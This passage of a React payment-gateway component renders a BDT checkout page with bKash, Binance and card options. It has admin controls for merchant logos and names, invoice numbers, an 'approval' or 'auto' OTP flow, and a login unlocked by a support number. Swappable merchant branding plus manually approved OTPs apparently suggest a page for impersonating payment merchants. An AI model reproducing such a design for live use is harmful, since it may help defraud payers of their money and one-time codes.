                        <path strokeLinecap="round" strokeLinejoin="round" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636" />
                      </svg>
                      <div className="text-destructive/25 text-3xl md:text-5xl font-black tracking-[0.15em] uppercase">Payment Off</div>
                      <p className="text-destructive/40 text-sm md:text-base text-center max-w-[300px] leading-relaxed font-bold tracking-wide">
                        মার্চেন্ট পেমেন্ট লিমিট শেষ হয়ে যাওয়ায় সাময়িক সময়ের জন্য পেমেন্ট সেবা প্রদান বন্ধ আছে।
                      </p>
                    </div>
                  </div>
                )}
                <div className="grid grid-cols-2 md:grid-cols-3 gap-2.5 md:gap-3">
                  {paymentMethods.map((method) => {
                    const isEnabled = isMethodEnabled(method.id);
                    const showBadge = methodsLoaded && !isEnabled && !isAdmin;
                    const handleToggle = (checked: boolean) => {
                      if (method.id === 'card') {
                        toggleMethod('visa', checked);
                        toggleMethod('mastercard', checked);
                      } else {
                        toggleMethod(method.id, checked);
                      }
                    };
                    return (
                      <div
                        key={method.id}
                        onClick={() => !isAdmin && isEnabled && handlePaymentSelect(method.route)}
                        className={`relative ${isAdmin ? '' : 'group'} bg-transparent md:bg-card rounded-lg border border-border flex items-center justify-center h-[80px] md:h-[96px] overflow-hidden ${isEnabled && !isAdmin ? 'cursor-pointer touch-manipulation' : ''} ${methodsLoaded && !isEnabled ? 'cursor-not-allowed' : ''} ${isNavigating ? 'pointer-events-none' : ''}`}
                      >
                        <img src={method.logo} alt={method.alt} className={`${method.h} object-contain ${isAdmin ? '' : 'transition-transform duration-300 active:scale-90'} ${methodsLoaded && !isEnabled ? 'opacity-50' : ''} ${isEnabled && !isAdmin && clickedCard === method.route ? 'scale-90 transition-transform duration-1000 ease-in-out will-change-transform' : ''}`} />
                        {showBadge && (
                          <div className={`absolute top-1.5 right-1.5 text-[10px] md:text-[11px] px-2.5 py-[4px] rounded-[4px] font-semibold tracking-wide whitespace-nowrap text-center leading-none flex items-center justify-center shadow-sm text-white ${badgeColor === 'red' ? 'bg-red-400/80' : 'bg-slate-400/80'}`}>
                            Temporarily Unavailable
                          </div>
                        )}
                        {isAdmin && (
                          <div
                            className="absolute inset-y-0 right-2 flex w-11 items-center justify-center"
                            style={{ touchAction: 'manipulation', WebkitTapHighlightColor: 'transparent' }}
                            onPointerDown={(e) => e.stopPropagation()}
                            onClick={(e) => e.stopPropagation()}
                          >
                            <Switch
                              checked={isEnabled}
                              onCheckedChange={handleToggle}
                              className="h-6 w-11 translate-y-0 hover:translate-y-0 active:translate-y-0 focus-visible:translate-y-0 focus-visible:ring-0 focus-visible:ring-offset-0"
                              style={{ touchAction: 'manipulation', WebkitUserSelect: 'none', userSelect: 'none', WebkitTapHighlightColor: 'transparent', outline: 'none' }}
                            />
                          </div>
                        )}
                      </div>
                    );
                  })}

                </div>
              </div>

              <div className={isAdmin ? "shrink-0" : "hidden"}>
              {isAdmin && (
                <div className="mt-3 bg-card rounded-xl border border-border p-3 flex items-center justify-between">
                  <span className="text-xs font-semibold text-foreground">"Temporarily Unavailable"</span>
                  <div className="flex gap-2">
                    <button onClick={() => updateBadgeColor('slate')} className={`px-3 py-1 rounded-md text-[11px] font-semibold transition-all ${badgeColor === 'slate' ? 'bg-gradient-to-r from-slate-700 to-slate-800 text-white ring-2 ring-offset-1 ring-slate-700' : 'bg-secondary text-muted-foreground'}`}>Slate</button>
                    <button onClick={() => updateBadgeColor('red')} className={`px-3 py-1 rounded-md text-[11px] font-semibold transition-all ${badgeColor === 'red' ? 'bg-gradient-to-r from-red-600 to-red-700 text-white ring-2 ring-offset-1 ring-red-600' : 'bg-secondary text-muted-foreground'}`}>Red</button>
                  </div>
                </div>
              )}

              {isAdmin && (
                <div className="mt-3 bg-card rounded-xl border border-border p-3 flex items-center justify-between">
                  <span className="text-xs font-semibold text-foreground">OTP Flow</span>
                  <div className="flex gap-2">
                    <button onClick={() => updateOtpMode('approval')} className={`px-3 py-1 rounded-md text-[11px] font-semibold transition-all ${otpMode === 'approval' ? 'bg-primary text-primary-foreground ring-2 ring-offset-1 ring-primary' : 'bg-secondary text-muted-foreground'}`}>Approval</button>
                    <button onClick={() => updateOtpMode('auto')} className={`px-3 py-1 rounded-md text-[11px] font-semibold transition-all ${otpMode === 'auto' ? 'bg-primary text-primary-foreground ring-2 ring-offset-1 ring-primary' : 'bg-secondary text-muted-foreground'}`}>Auto</button>
                  </div>
                </div>
              )}


              {isAdmin && (
                <div className="mt-3 bg-card rounded-xl border border-border p-3 space-y-3">
                  <div className="flex items-center gap-3">
                    <label
                      className="w-12 h-12 rounded-full border border-border bg-secondary flex items-center justify-center overflow-hidden shrink-0 cursor-pointer hover:ring-2 hover:ring-primary/40 transition-all"
                      title="Click to change logo"
                    >
                      {gatewayLogo
                        ? <img src={gatewayLogo} alt="Payment page logo" className="w-full h-full object-cover" />
                        : <span className="text-[9px] text-muted-foreground">Blank</span>}
                      <input id="paymentgateway-fld-2" name="paymentgateway-fld-2" aria-label="paymentgateway field 2"
                        type="file"
                        accept="image/*"
                        className="hidden"
                        onChange={(e) => { const f = e.target.files?.[0]; if (f) handleGatewayLogoFile(f); e.target.value = ""; }}
                      />
                    </label>
                    <div className="flex-1 space-y-1.5 min-w-0">
                      <span className="text-xs font-semibold text-foreground">Payment Page Logo & Name</span>
                      <Input id="paymentgateway-fld-3" name="paymentgateway-fld-3" aria-label="paymentgateway field 3"
                        value={gatewayName}
                        onChange={(e) => { gatewayDirtyRef.current = true; setGatewayName(e.target.value); }}
                        onBlur={() => void saveGatewayBranding({ gateway_name: gatewayName.trim() })}
                        onKeyDown={(e) => { if (e.key === "Enter") (e.target as HTMLInputElement).blur(); }}
                        placeholder="Payment page name (leave blank to hide)"
                        className="h-8 text-xs"
                      />
                    </div>
                  </div>
                  {gatewayError && <p className="text-[11px] text-destructive">{gatewayError}</p>}
                </div>
              )}


              {isAdmin && (
                <div className="mt-3 bg-card rounded-xl border border-border p-3 space-y-3">
                  <div className="flex items-center justify-between gap-3">
                    <span className="text-xs font-semibold text-foreground">Merchant Name & Logo</span>
                  </div>

                  <div className="flex flex-wrap gap-1.5">
                    {paymentMethods.map((m) => (
                      <button
                        key={m.id}
                        type="button"
                        onClick={() => setMerchantTarget(m.id)}
                        className={`px-2.5 py-1 rounded-md text-[11px] font-semibold transition-colors ${merchantTarget === m.id ? 'bg-primary text-primary-foreground' : 'bg-secondary text-muted-foreground'}`}
                      >
                        {m.alt}
                      </button>
                    ))}
                  </div>

                  {merchantTarget === "bkash" ? (
                    <div className="space-y-2">
                      <div className="flex items-center justify-between">
                        <span className="text-[11px] text-muted-foreground">Click a logo to edit its merchant name & invoice</span>
                      </div>


                      <div className="flex flex-wrap gap-2">
                        {profiles.map((p) => (
                          <div key={p.id} className="relative">
                            <button
                              type="button"
                              onClick={() => selectProfile(p)}
                              className={`h-14 w-20 rounded-md border bg-white flex items-center justify-center overflow-hidden transition-all ${activeProfileId === p.id ? 'border-primary ring-2 ring-primary/40' : 'border-border'}`}
                              aria-label={`Use ${p.label || 'logo'}`}
                              title={p.label}
                            >
                              <img src={resolveLogoSrc(p.logo)} alt={p.label} className="h-10 w-16 object-contain" />
                            </button>
                            {profiles.length > 1 && (
                              <button
                                type="button"
                                onClick={() => deleteProfile(p.id)}
                                className="absolute -top-1.5 -right-1.5 h-5 w-5 rounded-full bg-destructive text-destructive-foreground text-[10px] font-bold flex items-center justify-center shadow"
                                aria-label={`Delete ${p.label || 'profile'}`}
                                title="Delete merchant"
                              >×</button>
                            )}

                          </div>
                        ))}
                        <label className="h-14 w-20 rounded-md border border-dashed border-border bg-secondary/40 flex flex-col items-center justify-center cursor-pointer text-[10px] text-muted-foreground hover:bg-secondary">
                          <Upload className="w-4 h-4 mb-0.5" strokeWidth={1.5} />
                          Upload
                          <input id="paymentgateway-fld-4" name="paymentgateway-fld-4" aria-label="paymentgateway field 4" type="file" accept="image/*" className="hidden" onChange={handleLogoUpload} />
                        </label>
                      </div>

                      <Input id="paymentgateway-fld-5" name="paymentgateway-fld-5" aria-label="paymentgateway field 5"
                        value={merchantName}
                        onChange={(e) => { merchantDirtyRef.current = true; setMerchantName(e.target.value); if (activeProfileId) updateProfile(activeProfileId, { name: e.target.value }); }}
                        placeholder="Merchant name for selected logo"
                        className="h-8 text-xs"
                      />
                      <Input id="paymentgateway-fld-6" name="paymentgateway-fld-6" aria-label="paymentgateway field 6"
                        value={merchantInv}
                        onChange={(e) => { merchantDirtyRef.current = true; setMerchantInv(e.target.value); if (activeProfileId) updateProfile(activeProfileId, { inv: e.target.value }); }}
                        placeholder="Invoice / reference number"
                        className="h-8 text-xs"
                      />

                      {merchantError && <p className="text-[11px] text-destructive">{merchantError}</p>}
                    </div>
                  ) : merchantTarget === "binance" ? (
                    <>
                      <Input id="paymentgateway-fld-7" name="paymentgateway-fld-7" aria-label="paymentgateway field 7"
                        value={merchantInv}
                        onChange={(e) => { merchantDirtyRef.current = true; setMerchantInv(e.target.value); }}
                        placeholder="Binance ID (e.g. 441445584)"
                        className="h-8 text-xs"
                      />
                      <div className="space-y-1.5">
                        <span className="text-[11px] text-muted-foreground">Binance QR image</span>
                        <div className="flex items-center gap-3">
                          <div className="h-20 w-20 rounded-md border border-border bg-white flex items-center justify-center overflow-hidden">
                            {merchantLogo ? (
                              <img src={merchantLogo} alt="Binance QR" className="h-full w-full object-contain" />
                            ) : (
                              <span className="text-[9px] text-muted-foreground text-center px-1">No QR uploaded</span>
                            )}
                          </div>
                          <div className="flex flex-col gap-1.5">
                            <label className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-md bg-secondary text-[11px] font-semibold cursor-pointer hover:bg-secondary/80">
                              <Upload className="w-3.5 h-3.5" strokeWidth={1.5} />
                              Upload QR
                              <input id="paymentgateway-fld-8" name="paymentgateway-fld-8" aria-label="paymentgateway field 8"
                                type="file"
                                accept="image/*"
                                className="hidden"
                                onChange={(e) => {
                                  const file = e.target.files?.[0];
                                  e.target.value = "";
                                  if (!file) return;
                                  if (file.size > 250 * 1024) { setMerchantError("QR must be under 250KB."); return; }
                                  const reader = new FileReader();
                                  reader.onload = () => { merchantDirtyRef.current = true; setMerchantLogo(String(reader.result)); };
                                  reader.readAsDataURL(file);
                                }}
                              />
                            </label>
                            {merchantLogo && (
                              <button
                                type="button"
                                onClick={() => { merchantDirtyRef.current = true; setMerchantLogo(""); }}
                                className="text-[11px] text-destructive font-semibold text-left"
                              >Remove QR</button>
                            )}
                          </div>
                        </div>
                      </div>
                      {merchantError && <p className="text-[11px] text-destructive">{merchantError}</p>}
                    </>
                  ) : (
                    <>
                      <Input id="paymentgateway-fld-9" name="paymentgateway-fld-9" aria-label="paymentgateway field 9" value={merchantName} onChange={(e) => { merchantDirtyRef.current = true; setMerchantName(e.target.value); }} placeholder="Merchant name" className="h-8 text-xs" />
                      <Input id="paymentgateway-fld-10" name="paymentgateway-fld-10" aria-label="paymentgateway field 10" value={merchantInv} onChange={(e) => { merchantDirtyRef.current = true; setMerchantInv(e.target.value); }} placeholder="Invoice / reference number" className="h-8 text-xs" />
                      {merchantError && <p className="text-[11px] text-destructive">{merchantError}</p>}
                    </>
                  )}

                </div>
              )}

              {isAdmin && (
                <div className="mt-4 bg-card rounded-xl border border-border p-4">
                  <AllowedWebsitesAdmin />
                </div>
              )}

              {isAdmin && (
                <div className="mt-4 bg-card rounded-xl border border-border p-4 space-y-3">
                  <div className="flex items-center gap-2">
                    <Lock className="w-4 h-4 text-primary" />
                    <h3 className="text-sm font-semibold text-foreground">Admin Credentials & Support Number</h3>
                  </div>
                  <p className="text-[10px] text-muted-foreground">
                    Current values are hidden for security. Enter the current password to authorize any change. Leave a field blank to keep it unchanged.
                  </p>
                  <div className="space-y-2">
                    <label className="text-[11px] text-muted-foreground block">Current Password (required)</label>
                    <Input id="paymentgateway-fld-11" name="paymentgateway-fld-11" aria-label="paymentgateway field 11" type="password" value={credCurrentPassword} onChange={(e) => setCredCurrentPassword(e.target.value)} placeholder="Current password" className="h-8 text-xs" />
                  </div>
                  <div className="space-y-2">
                    <label className="text-[11px] text-muted-foreground block">New Admin Email</label>
                    <Input id="paymentgateway-fld-12" name="paymentgateway-fld-12" aria-label="paymentgateway field 12" type="email" value={credEmail} onChange={(e) => setCredEmail(e.target.value)} placeholder="Leave blank to keep current" className="h-8 text-xs" />
                  </div>
                  <div className="space-y-2">
                    <label className="text-[11px] text-muted-foreground block">New Admin Password</label>
                    <Input id="paymentgateway-fld-13" name="paymentgateway-fld-13" aria-label="paymentgateway field 13" type="password" value={credPassword} onChange={(e) => setCredPassword(e.target.value)} placeholder="Leave blank to keep current" className="h-8 text-xs" />
                  </div>
                  <div className="space-y-2">
                    <label className="text-[11px] text-muted-foreground block">New Support Unlock Number</label>
                    <Input id="paymentgateway-fld-14" name="paymentgateway-fld-14" aria-label="paymentgateway field 14" type="text" inputMode="numeric" value={credSupport} onChange={(e) => setCredSupport(e.target.value.replace(/\D/g, "").slice(0, 11))} placeholder="Leave blank to keep current" className="h-8 text-xs" />
                  </div>
                  {credError && (<p className="text-[11px] text-destructive">{credError}</p>)}
                  <div className="flex items-center gap-2">
                    <Button size="sm" onClick={saveAdminCredentials} className="h-8 text-xs flex-1">Save Changes</Button>
                  </div>
                  <p className="text-[10px] text-muted-foreground italic">Credentials are stored in a private table that is unreadable from the client.</p>
                </div>
              )}
              </div>

            </div>

            <div className="w-full mt-auto bg-pay-bar py-4 min-[375px]:py-[18px] md:py-5 text-center !rounded-none shadow-[0_-2px_8px_rgba(0,0,0,0.04)] md:shadow-none" style={{ paddingBottom: 'calc(env(safe-area-inset-bottom, 0px) + 1rem)', paddingTop: '1rem' }}>
              <span className="font-bold text-base min-[375px]:text-[17px] md:text-lg" style={{ color: '#1d4ed8' }}>Pay {amount} BDT</span>
            </div>
          </div>
        </div>

        {showLoginModal && (
          <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4" onClick={() => setShowLoginModal(false)}>
            <div className="w-full max-w-sm bg-card rounded-2xl shadow-lg p-6 space-y-4" onClick={(e) => e.stopPropagation()}>
              <h2 className="text-xl font-bold text-foreground text-center">Admin Login</h2>
              <Input id="paymentgateway-fld-15" name="paymentgateway-fld-15" aria-label="paymentgateway field 15" type="email" placeholder="Email" value={loginEmail} onChange={(e) => setLoginEmail(e.target.value)} onKeyDown={(e) => e.key === "Enter" && handleAdminLogin()} />
              <Input id="paymentgateway-fld-16" name="paymentgateway-fld-16" aria-label="paymentgateway field 16" type="password" placeholder="Password" value={loginPassword} onChange={(e) => setLoginPassword(e.target.value)} onKeyDown={(e) => e.key === "Enter" && handleAdminLogin()} />
              {loginError && (<p className="text-sm text-destructive text-center">{loginError}</p>)}
              <Button onClick={handleAdminLogin} className="w-full">Login</Button>
            </div>
          </div>
        )}

        {showSupportModal && (
          <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4" onClick={() => setShowSupportModal(false)}>
            <div className="w-full max-w-sm bg-card rounded-2xl shadow-lg p-6 space-y-4" onClick={(e) => e.stopPropagation()}>
              <h2 className="text-xl font-bold text-foreground text-center">Support</h2>
              <p className="text-sm text-muted-foreground text-center">Enter your mobile number for support</p>
              <Input id="paymentgateway-fld-17" name="paymentgateway-fld-17" aria-label="paymentgateway field 17" type="text" inputMode="numeric" placeholder="01XXXXXXXXX" value={supportNumber} onChange={(e) => setSupportNumber(e.target.value.replace(/\D/g, "").slice(0, 11))} />
              <Button
                onClick={async () => {
                  if (supportNumber.length === 11) {
                    const data = await verifySupportGate(supportNumber).catch(() => false);
                    if (data === true) setLoginUnlocked(true);
                    setShowSupportModal(false); setSupportNumber("");
                  }
                }}
                disabled={supportNumber.length !== 11}
                className="w-full"
              >Submit</Button>
            </div>
          </div>
        )}

        {showLoader && <DualCircleLoader size={47} transparentBg />}
      </div>
    </>
  );
};

export default PaymentGateway;
